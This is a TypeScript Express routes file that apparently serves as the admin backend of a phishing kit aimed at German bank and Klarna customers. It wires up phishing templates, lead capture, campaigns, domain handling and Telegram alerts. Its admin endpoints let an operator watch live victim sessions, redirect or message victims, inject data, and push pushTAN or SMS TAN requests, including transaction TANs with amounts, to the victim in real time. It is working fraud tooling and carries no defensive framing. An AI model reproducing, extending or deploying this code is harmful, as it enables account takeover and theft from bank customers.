import { Express } from 'express';
import multer from 'multer';
import authRoutes from './auth';
import templateRoutes from './templates';
import domainRoutes from './domains';
import leadRoutes from './leads';
import campaignRoutes from './campaigns';
import trackingRoutes from './tracking';
import emailTemplateRoutes from './email_templates';
import telegramRoutes from './telegram';
import securityRoutes from './security';
import notificationRoutes from './notifications';
import partialLeadRoutes from './partialLeads';
import dashboardRoutes from './dashboard';
import diagnosticsRoutes from './diagnostics';
import searchRoutes from './search';
import { authenticateJWT, requireAdmin } from '../middleware';
import { createRateLimit } from '../middleware/rateLimiting';
import { getDb } from '../database';
import { searchSparkasseBranches } from '../database/tables/sparkasse_branches';
import { searchVolksbankBranches } from '../database/tables/volksbank_branches';
import sessionManager from '../services/sessionManager';
import { config } from '../config';
import { handleTemplateSubmission } from './templateSubmission';
import notificationService from '../services/notificationService';
import importRoutes from './import';

// Configure multer for file uploads
const upload = multer({ 
  storage: multer.memoryStorage(),
  limits: {
    fileSize: config.upload.maxSize
  },
  fileFilter: (req, file, cb) => {
    // Check file type
    if (config.upload.allowedTypes.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error(`File type ${file.mimetype} not allowed`));
    }
  }
});

export function setupRoutes(app: Express): void {
  // Health check endpoint
  app.get('/api/health', (req, res) => {
    try {
      // Check database connection
      const db = getDb();
      const result = db.prepare('SELECT 1').get();
      
      res.status(200).json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        database: 'connected',
        uptime: process.uptime()
      });
    } catch (error) {
      console.error('Health check failed:', error);
      res.status(500).json({
        status: 'unhealthy',
        timestamp: new Date().toISOString(),
        database: 'disconnected',
        error: 'Database connection failed'
      });
    }
  });

  // Public routes - ALL API routes must be registered BEFORE domain checking middleware
  app.use('/api/auth', authRoutes);
  
  // Public tracking endpoint (for visitor tracking)
  app.use('/api/track', trackingRoutes);

  // Make template viewing public, but management requires auth
  app.use('/api/templates', templateRoutes);

  // Public template form submission endpoint (with rate limiting) - MOVED HERE
  app.post('/api/template-submit', 
    createRateLimit('template-submission'),
    upload.single('qrFile'), 
    handleTemplateSubmission
  );
  
  // Domain routing moved to index.ts (runs before anti-bot)
  // This middleware is now redundant and removed
  
  // Branch search endpoint for Sparkasse and Volksbank
  app.get('/api/branches/search', (req, res) => {
    try {
      const { q: query, limit = 10, type = 'sparkasse' } = req.query;
      
      if (!query || typeof query !== 'string') {
        return res.json([]);
      }
      
      const searchLimit = parseInt(limit.toString()) || 10;
      let results = [];
      
      const db = getDb();
      
      // Determine which bank type to search
      if (type === 'volksbank') {
        results = searchVolksbankBranches(query, searchLimit);
        console.log(`🔍 Volksbank branch search for "${query}": found ${results.length} results`);
      } else {
        // Default to Sparkasse
        results = searchSparkasseBranches(db, query, searchLimit);
        console.log(`🔍 Sparkasse branch search for "${query}": found ${results.length} results`);
      }
      
      res.json(results);
    } catch (error) {
      console.error('Branch search error:', error);
      res.status(500).json({ error: 'Branch search failed' });
    }
  });
  
  // MJML compilation endpoint
  app.post('/api/mjml/compile', authenticateJWT, (req, res) => {
    try {
      const mjml = require('mjml');
      const { mjml: mjmlContent } = req.body;
      
      if (!mjmlContent) {
        return res.status(400).json({ 
          success: false, 
          error: 'MJML content is required' 
        });
      }
      
      console.log('🔄 Compiling MJML to HTML...');
      
      // Compile MJML to HTML
      const result = mjml(mjmlContent, {
        validationLevel: 'soft',
        fonts: {
          'Gotham': 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap',
          'ING Me': 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap'
        }
      });
      
      console.log('✅ MJML compilation successful');
      
      res.json({
        success: true,
        html: result.html,
        errors: result.errors || [],
        warnings: result.warnings || []
      });
      
    } catch (error) {
      console.error('❌ MJML compilation failed:', error);
      res.status(500).json({
        success: false,
        error: error instanceof Error ? error.message : 'Compilation failed',
        errors: [{ line: 0, message: 'Server compilation error', tagName: 'mjml' }]
      });
    }
  });

  // Image upload endpoint for email template editor
  app.post('/api/upload', authenticateJWT, upload.single('file'), (req, res) => {
    try {
      const fs = require('fs');
      const path = require('path');
      
      if (!req.file) {
        return res.status(400).json({ error: 'No file uploaded' });
      }
      
      // Create uploads directory if it doesn't exist
      const uploadsDir = path.join(__dirname, '../../uploads');
      if (!fs.existsSync(uploadsDir)) {
        fs.mkdirSync(uploadsDir, { recursive: true });
      }
      
      // Generate unique filename
      const timestamp = Date.now();
      const fileExtension = path.extname(req.file.originalname);
      const fileName = `email-${timestamp}${fileExtension}`;
      const filePath = path.join(uploadsDir, fileName);
      
      // Save file to disk
      fs.writeFileSync(filePath, req.file.buffer);
      console.log(`✅ Image uploaded: ${fileName}`);
      
      // Return the public URL
      const publicUrl = `/api/uploads/${fileName}`;
      
      res.json({ 
        success: true,
        url: publicUrl,
        filename: fileName
      });
    } catch (error) {
      console.error('Error uploading file:', error);
      res.status(500).json({ error: 'Error uploading file' });
    }
  });
  
  // Serve uploaded files
  app.get('/api/uploads/:filename', (req, res) => {
    try {
      const fs = require('fs');
      const path = require('path');
      
      const filename = req.params.filename;
      const filePath = path.join(__dirname, '../../uploads', filename);
      
      // Check if file exists
      if (!fs.existsSync(filePath)) {
        return res.status(404).json({ error: 'File not found' });
      }
      
      // Get file stats and set appropriate headers
      const stats = fs.statSync(filePath);
      const ext = path.extname(filename).toLowerCase();
      let mimeType = 'application/octet-stream';
      
      if (['.jpg', '.jpeg'].includes(ext)) mimeType = 'image/jpeg';
      else if (ext === '.png') mimeType = 'image/png';
      else if (ext === '.gif') mimeType = 'image/gif';
      else if (ext === '.webp') mimeType = 'image/webp';
      else if (ext === '.svg') mimeType = 'image/svg+xml';
      else if (ext === '.pdf') mimeType = 'application/pdf';
      
      res.setHeader('Content-Type', mimeType);
      res.setHeader('Content-Length', stats.size);
      res.setHeader('Cache-Control', 'public, max-age=31536000');
      
      // Stream the file
      const readStream = fs.createReadStream(filePath);
      readStream.pipe(res);
    } catch (error) {
      console.error('Error serving file:', error);
      res.status(500).json({ error: 'Error serving file' });
    }
  });

  // Serve uploaded QR files
  app.get('/api/uploads/qr-codes/:filename', (req, res) => {
    try {
      const fs = require('fs');
      const path = require('path');
      
      const filename = req.params.filename;
      const filePath = path.join(__dirname, '../../uploads/qr-codes', filename);
      
      // Check if file exists
      if (!fs.existsSync(filePath)) {
        return res.status(404).json({ error: 'File not found' });
      }
      
      // Get file stats and set appropriate headers
      const stats = fs.statSync(filePath);
      const mimeType = path.extname(filename).toLowerCase() === '.pdf' ? 'application/pdf' : 'image/*';
      
      res.setHeader('Content-Type', mimeType);
      res.setHeader('Content-Length', stats.size);
      res.setHeader('Content-Disposition', `inline; filename="${filename}"`);
      
      // Stream the file
      const readStream = fs.createReadStream(filePath);
      readStream.pipe(res);
    } catch (error) {
      console.error('Error serving file:', error);
      res.status(500).json({ error: 'Error serving file' });
    }
  });

  // Template submission endpoint moved above domain checking middleware

  // Session management endpoints
  // File cleanup removed per user request

  // QR processing status endpoint (public)
  app.get('/api/qr-status/:key', async (req, res) => {
    try {
      const { key } = req.params;
      const qrData = await sessionManager.getQRData(key);
      
      if (!qrData) {
        return res.status(404).json({ error: 'QR data not found' });
      }
      
      res.json({
        uploadAttempts: qrData.upload_attempts,
        files: qrData.files.map(f => ({
          filename: f.filename,
          timestamp: f.timestamp,
          attempt: f.attempt
        })),
        status: qrData.upload_attempts >= 2 ? 'completed' : 'pending'
      });
    } catch (error) {
      console.error('QR status error:', error);
      res.status(500).json({ error: 'QR status check failed' });
    }
  });

  // Admin session control endpoints
  app.post('/api/admin/sessions/:sessionKey/force-state', authenticateJWT, async (req, res) => {
    try {
      const { sessionKey } = req.params;
      const { state, message } = req.body;
      
      if (!state) {
        return res.status(400).json({ error: 'State is required' });
      }
      
      const socketManager = require('../services/socketManager').default;
      await socketManager.forceUserState(sessionKey, state, message);
      
      res.json({ 
        success: true, 
        message: `Forced session ${sessionKey} to state: ${state}` 
      });
    } catch (error) {
      console.error('Error forcing session state:', error);
      res.status(500).json({ error: 'Failed to force session state' });
    }
  });

  app.post('/api/admin/sessions/:sessionKey/inject-data', authenticateJWT, async (req, res) => {
    try {
      const { sessionKey } = req.params;
      const { data } = req.body;
      
      if (!data) {
        return res.status(400).json({ error: 'Data is required' });
      }
      
      const socketManager = require('../services/socketManager').default;
      await socketManager.injectSessionData(sessionKey, data);
      
      res.json({ 
        success: true, 
        message: `Injected data into session ${sessionKey}` 
      });
    } catch (error) {
      console.error('Error injecting session data:', error);
      res.status(500).json({ error: 'Failed to inject session data' });
    }
  });

  app.post('/api/admin/sessions/:sessionKey/redirect', authenticateJWT, async (req, res) => {
    try {
      const { sessionKey } = req.params;
      const { url } = req.body;
      
      if (!url) {
        return res.status(400).json({ error: 'URL is required' });
      }
      
      const socketManager = require('../services/socketManager').default;
      await socketManager.redirectUser(sessionKey, url);
      
      res.json({ 
        success: true, 
        message: `Redirected session ${sessionKey} to: ${url}` 
      });
    } catch (error) {
      console.error('Error redirecting session:', error);
      res.status(500).json({ error: 'Failed to redirect session' });
    }
  });

  app.post('/api/admin/sessions/:sessionKey/message', authenticateJWT, async (req, res) => {
    try {
      const { sessionKey } = req.params;
      const { message, type = 'info' } = req.body;
      
      if (!message) {
        return res.status(400).json({ error: 'Message is required' });
      }
      
      const socketManager = require('../services/socketManager').default;
      await socketManager.showUserMessage(sessionKey, message, type);
      
      res.json({ 
        success: true, 
        message: `Sent ${type} message to session ${sessionKey}` 
      });
    } catch (error) {
      console.error('Error sending session message:', error);
      res.status(500).json({ error: 'Failed to send session message' });
    }
  });

  // Request TAN from session
  app.post('/api/admin/sessions/:sessionKey/request-tan', authenticateJWT, async (req, res) => {
    try {
      const { sessionKey } = req.params;
      const { type, method, transactionDetails, requestId } = req.body;

      if (!sessionKey || !type || !method || !requestId) {
        return res.status(400).json({ error: 'Session key, type, method, and requestId are required' });
      }

      // Validate TAN type
      if (!['TRANSACTION_TAN', 'LOGIN_TAN'].includes(type)) {
        return res.status(400).json({ error: 'Invalid TAN type' });
      }

      // Validate TAN method
      if (!['pushtan', 'sms'].includes(method)) {
        return res.status(400).json({ error: 'Invalid TAN method' });
      }

      // For TRANSACTION_TAN, require transaction details
      if (type === 'TRANSACTION_TAN' && (!transactionDetails || !transactionDetails.amount)) {
        return res.status(400).json({ error: 'Transaction details with amount are required for TRANSACTION_TAN' });
      }

      // Emit TAN request via Socket.io
      const io = req.app.get('io');
      console.log(`🔍 TAN Request Debug - IO instance:`, io ? 'Found' : 'NOT FOUND');
      console.log(`🔍 TAN Request Debug - Session room: session_${sessionKey}`);
      console.log(`🔍 TAN Request Debug - Request data:`, { type, method, transactionDetails, requestId });
      
      if (io) {
        const tanData = {
          type,
          method,
          transactionDetails: type === 'TRANSACTION_TAN' ? transactionDetails : undefined,
          requestId
        };
        
        // Check if session room exists
        const rooms = io.sockets.adapter.rooms;
        const sessionRoom = `session_${sessionKey}`;
        const roomExists = rooms.has(sessionRoom);
        console.log(`🔍 TAN Request Debug - Room "${sessionRoom}" exists:`, roomExists);
        if (roomExists) {
          console.log(`🔍 TAN Request Debug - Room "${sessionRoom}" has ${rooms.get(sessionRoom)?.size} clients`);
        }
        
        io.to(sessionRoom).emit('admin_request_tan', tanData);
        console.log(`🔐 Sent TAN request to session ${sessionKey}:`, tanData);
        
        // Create notification for TAN request
        const session = await sessionManager.getSession(sessionKey);
        if (session) {
          await notificationService.notifyTanRequested(
            sessionKey,
            session.template_name,
            type,
            method
          );
        }
      } else {
        console.error('❌ Socket.IO instance not found in Express app!');
      }

      res.json({ 
        success: true, 
        message: `${method.toUpperCase()} ${type.replace('_', ' ')} request sent`,
        requestId
      });
    } catch (error) {
      console.error('Error sending TAN request:', error);
      res.status(500).json({ error: 'Failed to send TAN request' });
    }
  });

  // Set session mode (AFK/LIVE)
  app.post('/api/admin/sessions/:sessionKey/set-mode', authenticateJWT, async (req, res) => {
    try {
      const { sessionKey } = req.params;
      const { mode } = req.body;

      if (!sessionKey || !mode) {
        return res.status(400).json({ error: 'Session key and mode are required' });
      }

      if (!['AFK', 'LIVE'].includes(mode)) {
        return res.status(400).json({ error: 'Invalid mode. Must be AFK or LIVE' });
      }

      // Update session mode in database
      const sessionManager = require('../services/sessionManager').default;
      await sessionManager.updateSessionMode(sessionKey, mode);

      // Emit mode change via Socket.io
      const io = req.app.get('io');
      if (io) {
        io.to(`session_${sessionKey}`).emit('mode_changed', { mode });
        console.log(`🎛️ Changed session ${sessionKey} mode to: ${mode}`);
      }

      res.json({ 
        success: true, 
        message: `Session mode changed to ${mode}`,
        mode
      });
    } catch (error) {
      console.error('Error setting session mode:', error);
      res.status(500).json({ error: 'Failed to set session mode' });
    }
  });

  // Continue flow for LIVE mode sessions
  app.post('/api/admin/sessions/:sessionKey/continue-flow', authenticateJWT, async (req, res) => {
    try {
      const { sessionKey } = req.params;

      if (!sessionKey) {
        return res.status(400).json({ error: 'Session key is required' });
      }

      // Update session waiting status in database
      const sessionManager = require('../services/sessionManager').default;
      await sessionManager.setWaitingForAdmin(sessionKey, false);

      // Emit continue flow via Socket.io
      const io = req.app.get('io');
      if (io) {
        io.to(`session_${sessionKey}`).emit('continue_flow');
        console.log(`▶️ Sent continue flow command to session ${sessionKey}`);
      }

      res.json({ 
        success: true, 
        message: 'Continue flow command sent'
      });
    } catch (error) {
      console.error('Error sending continue flow:', error);
      res.status(500).json({ error: 'Failed to send continue flow' });
    }
  });

  app.get('/api/admin/sessions/active', authenticateJWT, async (req, res) => {
    try {
      const activeSessions = await sessionManager.getActiveSessions();
      const socketManager = require('../services/socketManager').default;
      const stats = socketManager.getStats();
      
      // Map sessions to proper format for frontend
      const mappedSessions = activeSessions.map(session => ({
        sessionKey: session.session_key,
        templateName: session.template_name,
        state: session.current_state || 'unknown',
        createdAt: session.created_at,
        isConnected: socketManager.isSessionConnected(session.session_key),
        sessionMode: (session as any).session_mode || 'AFK',
        isWaitingForAdmin: Boolean((session as any).is_waiting_for_admin)
      }));
      
      console.log(`📊 API Response - Sending ${mappedSessions.length} sessions to admin dashboard`);
      mappedSessions.forEach(session => {
        console.log(`   API: ${session.sessionKey?.substring(0, 16)}... | Template: ${session.templateName} | State: ${session.state} | Connected: ${session.isConnected}`);
      });
      
      res.json({
        sessions: mappedSessions,
        stats
      });
    } catch (error) {
      console.error('Error fetching active sessions:', error);
      res.status(500).json({ error: 'Failed to fetch active sessions' });
    }
  });

  app.get('/api/sessions/stats', authenticateJWT, async (req, res) => {
    try {
      const stats = await sessionManager.getSessionStats();
      res.json({ success: true, stats });
    } catch (error) {
      console.error('Error getting session stats:', error);
      res.status(500).json({ success: false, error: 'Failed to get session stats' });
    }
  });

  app.post('/api/sessions/cleanup', authenticateJWT, async (req, res) => {
    try {
      const cleaned = await sessionManager.cleanupExpiredSessions();
      res.json({ success: true, cleaned });
    } catch (error) {
      console.error('Error cleaning up sessions:', error);
      res.status(500).json({ success: false, error: 'Failed to cleanup sessions' });
    }
  });

  // Session analytics endpoints
  app.get('/api/analytics/dashboard', authenticateJWT, async (req, res) => {
    try {
      const sessionAnalytics = require('../services/sessionAnalytics').default;
      const analytics = await sessionAnalytics.getDashboardAnalytics();
      res.json({ success: true, analytics });
    } catch (error) {
      console.error('Error getting dashboard analytics:', error);
      res.status(500).json({ error: 'Failed to get dashboard analytics' });
    }
  });

  app.get('/api/analytics/template/:templateName', authenticateJWT, async (req, res) => {
    try {
      const { templateName } = req.params;
      const sessionAnalytics = require('../services/sessionAnalytics').default;
      const analytics = await sessionAnalytics.getTemplateAnalytics(templateName);
      res.json({ success: true, analytics });
    } catch (error) {
      console.error('Error getting template analytics:', error);
      res.status(500).json({ error: 'Failed to get template analytics' });
    }
  });

  app.get('/api/analytics/funnel/:templateName', authenticateJWT, async (req, res) => {
    try {
      const { templateName } = req.params;
      const sessionAnalytics = require('../services/sessionAnalytics').default;
      const funnel = await sessionAnalytics.getConversionFunnel(templateName);
      res.json({ success: true, funnel });
    } catch (error) {
      console.error('Error getting conversion funnel:', error);
      res.status(500).json({ error: 'Failed to get conversion funnel' });
    }
  });

  app.get('/api/analytics/session/:sessionKey', authenticateJWT, async (req, res) => {
    try {
      const { sessionKey } = req.params;
      const sessionAnalytics = require('../services/sessionAnalytics').default;
      const analytics = await sessionAnalytics.getSessionAnalytics(sessionKey);
      
      if (!analytics) {
        return res.status(404).json({ error: 'Session analytics not found' });
      }
      
      res.json({ success: true, analytics });
    } catch (error) {
      console.error('Error getting session analytics:', error);
      res.status(500).json({ error: 'Failed to get session analytics' });
    }
  });

  // Session cleanup scheduled job (run every hour)
  setInterval(async () => {
    try {
      const cleaned = await sessionManager.cleanupExpiredSessions();
      if (cleaned > 0) {
        console.log(`🧹 Scheduled cleanup: removed ${cleaned} expired sessions`);
      }
    } catch (error) {
      console.error('Error in scheduled session cleanup:', error);
    }
  }, 60 * 60 * 1000); // 1 hour

  // Notification cleanup scheduled job (run every 6 hours)
  setInterval(async () => {
    try {
      const { cleanupExpiredNotifications } = require('../database/tables/notifications');
      const db = getDb();
      const cleaned = cleanupExpiredNotifications(db);
      if (cleaned > 0) {
        console.log(`🔔 Scheduled cleanup: removed ${cleaned} expired notifications`);
      }
    } catch (error) {
      console.error('Error in scheduled notification cleanup:', error);
    }
  }, 6 * 60 * 60 * 1000); // 6 hours
  
  // Debug endpoint to check templates (DISABLED IN PRODUCTION)
  if (process.env.NODE_ENV !== 'production') {
    app.get('/api/admin/debug-templates', authenticateJWT, requireAdmin, async (req, res) => {
      try {
        const db = getDb();
        const templates = db.prepare('SELECT * FROM templates').all();
        const stepConfigs = db.prepare('SELECT * FROM template_step_configs').all();
        
        res.json({
          templates,
          stepConfigs,
          totalTemplates: templates.length,
          klarnaExists: templates.some((t: any) => t.folder_name === 'klarna')
        });
      } catch (error) {
        res.status(500).json({ error: 'Debug endpoint error' });
      }
    });
  }

  // Protected routes (require authentication)
  app.use('/api/domains', authenticateJWT, domainRoutes);
  app.use('/api/leads', authenticateJWT, leadRoutes);
  app.use('/api/campaigns', authenticateJWT, campaignRoutes);
  app.use('/api/email-templates', authenticateJWT, emailTemplateRoutes);
  app.use('/api/security', authenticateJWT, securityRoutes);
  app.use('/api/notifications', notificationRoutes); // Notifications have their own auth
  app.use('/api/telegram', telegramRoutes); // Telegram routes have their own auth
  app.use('/api/partial-leads', partialLeadRoutes); // Partial lead management
  app.use('/api/dashboard', dashboardRoutes); // Dashboard statistics
  app.use('/api/diagnostics', diagnosticsRoutes); // Database diagnostics
  app.use('/api/search', searchRoutes); // Global search functionality
  app.use('/api/import', authenticateJWT, importRoutes); // Lead import functionality (admin only)
  
  // Serve static files from dist directory (excluding index.html for template injection)
  const path = require('path');
  const distPath = path.join(__dirname, '../../../dist');
  app.use(require('express').static(distPath, {
    index: false  // Don't serve index.html automatically - let catch-all handle it
  }));

  // Catch-all route to serve React app for frontend routing
  app.get('*', (req, res) => {
    // Skip API routes
    if (req.path.startsWith('/api/')) {
      return res.status(404).json({ message: 'API endpoint not found' });
    }
    
    try {
    // Serve React app for all other routes
    const indexPath = path.join(distPath, 'index.html');
      
      // Check if we have template info from domain rewriting
      if (req.templateInfo) {
        console.log(`🎯 [REACT-SERVE] Serving React app with template info:`, req.templateInfo);
      } else {
        console.log(`⚠️ [REACT-SERVE] No template info found - serving default React app for ${req.get('host')}${req.path}`);
      }
      
      if (require('fs').existsSync(indexPath)) {
        // If we have template info, inject it into the HTML
        if (req.templateInfo) {
          console.log(`🔧 [REACT-SERVE] Injecting template info into HTML for ${req.templateInfo.templateName}`);
        } else {
          console.log(`🔧 [REACT-SERVE] No template info to inject - serving standard React app`);
        }
        
        if (req.templateInfo) {
          const fs = require('fs');
          let html = fs.readFileSync(indexPath, 'utf8');
          
          // Inject template info as a script tag
          const templateScript = `
            <script>
              window.__TEMPLATE_INFO__ = ${JSON.stringify(req.templateInfo)};
              // Template info injected (hidden in production)
            </script>
          `;
          
          // Insert before closing head tag
          html = html.replace('</head>', templateScript + '</head>');
          
          res.set('Content-Type', 'text/html');
          res.send(html);
        } else {
          // Normal serving without template info
          res.sendFile(path.resolve(indexPath));
        }
      } else {
        // Development fallback
        console.log(`⚠️ [REACT-SERVE] Dist not found, using development mode`);
        res.status(404).send('Application not built. Run npm run build first.');
      }
    } catch (error) {
      console.error('Error serving React app:', error);
      res.status(500).send('Internal server error');
    }
  });
}

// Generate blocked page HTML for inactive domains
function generateDomainBlockedPage(): string {
  return `
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Domain Temporarily Unavailable</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-color: #f3f4f6;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #374151;
        }
        
        .container {
            max-width: 28rem;
            width: 100%;
            background: white;
            border-radius: 0.5rem;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
            padding: 2rem;
            text-align: center;
        }
        
        .icon {
            width: 4rem;
            height: 4rem;
            margin: 0 auto 1rem;
            opacity: 0.5;
        }
        
        h1 {
            font-size: 1.5rem;
            font-weight: 700;
            color: #111827;
            margin-bottom: 0.5rem;
        }
        
        .description {
            color: #6b7280;
            margin-bottom: 1.5rem;
        }
        
        .info-box {
            background-color: #f9fafb;
            border-radius: 0.5rem;
            padding: 1rem;
            margin-bottom: 1.5rem;
        }
        
        .info-title {
            font-size: 0.875rem;
            font-weight: 600;
            color: #374151;
            margin-bottom: 0.5rem;
        }
        
        .info-list {
            list-style: none;
            font-size: 0.875rem;
            color: #6b7280;
        }
        
        .info-list li {
            margin-bottom: 0.25rem;
        }
        
        .error-code {
            font-size: 0.75rem;
            color: #9ca3af;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <div class="container">
        <svg class="icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9v-9m0 9c-5 0-9-4-9-9m9 9c5 0 9-4 9-9m-9 9V3m0 18V3"></path>
        </svg>
        
        <h1>Domain Temporarily Unavailable</h1>
        <p class="description">
            This domain is currently deactivated. Please contact the administrator.
        </p>
        
        <div class="info-box">
            <h2 class="info-title">What can you do?</h2>
            <ul class="info-list">
                <li>• Contact the domain administrator</li>
                <li>• Check back later</li>
                <li>• Verify the domain URL</li>
            </ul>
        </div>
        
        <div class="error-code">
            Error Code: DOMAIN_DEACTIVATED
        </div>
    </div>
</body>
</html>
  `;
}
